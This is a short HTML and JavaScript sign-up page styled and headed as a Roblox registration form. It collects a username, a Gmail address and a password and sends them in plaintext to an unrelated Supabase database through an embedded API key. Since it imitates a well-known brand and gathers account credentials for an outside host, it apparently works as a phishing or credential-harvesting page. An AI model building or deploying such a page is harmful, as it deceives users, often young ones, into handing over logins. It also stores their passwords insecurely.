<!DOCTYPE html>
<html>
<head>
<title>Roblox Style Register</title>

<style>
body{
    margin:0;
    font-family:Arial;
    background:#1f1f1f;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}

.box{
    width:340px;
    background:#2b2d30;
    padding:25px;
    border-radius:12px;
    text-align:center;
    color:white;
    box-shadow:0 0 15px rgba(0,0,0,0.6);
}

h1{
    color:#00A2FF;
    margin-bottom:15px;
}

input{
    width:100%;
    padding:10px;
    margin:8px 0;
    border:none;
    border-radius:6px;
    outline:none;
}

button{
    width:100%;
    padding:10px;
    margin-top:10px;
    background:#00A2FF;
    border:none;
    color:white;
    border-radius:6px;
    cursor:pointer;
    font-weight:bold;
}

button:hover{
    background:#008ed6;
}

#msg{
    margin-top:10px;
    font-size:13px;
    color:#ffcc00;
    word-break:break-word;
}
</style>
</head>

<body>

<div class="box">
    <h1>ROBLOX REGISTER</h1>

    <input type="text" id="username" placeholder="Username">
    <input type="email" id="gmail" placeholder="Gmail">
    <input type="password" id="password" placeholder="Password">

    <button onclick="register()">Register</button>

    <p id="msg"></p>
</div>

<script>
const SUPABASE_URL = "https://ogqaxkbfnlfcgkmlbnpq.supabase.co";
const SUPABASE_KEY = "sb_publishable_s4NlhIOK-kuMjeBneYa1zQ_L2Q-EXza";

async function register() {

    const username = document.getElementById("username").value;
    const gmail = document.getElementById("gmail").value;
    const password = document.getElementById("password").value;

    document.getElementById("msg").innerText = "Loading...";

    try {
        const res = await fetch(SUPABASE_URL + "/rest/v1/users", {
            method: "POST",
            headers: {
                apikey: SUPABASE_KEY,
                Authorization: "Bearer " + SUPABASE_KEY,
                "Content-Type": "application/json",
                Prefer: "return=representation"
            },
            body: JSON.stringify({
                username: username,
                gmail: gmail,
                password: password
            })
        });

        const data = await res.json().catch(() => null);

        console.log("STATUS:", res.status);
        console.log("RESPONSE:", data);

        if (res.ok) {
            document.getElementById("msg").innerText =
                "✅ Registered Successfully!";
        } else {
            document.getElementById("msg").innerText =
                "❌ Error: " + JSON.stringify(data);
        }

    } catch (err) {
        document.getElementById("msg").innerText =
            "❌ Network Error: " + err.message;
    }
}
</script>

</body>
</html>
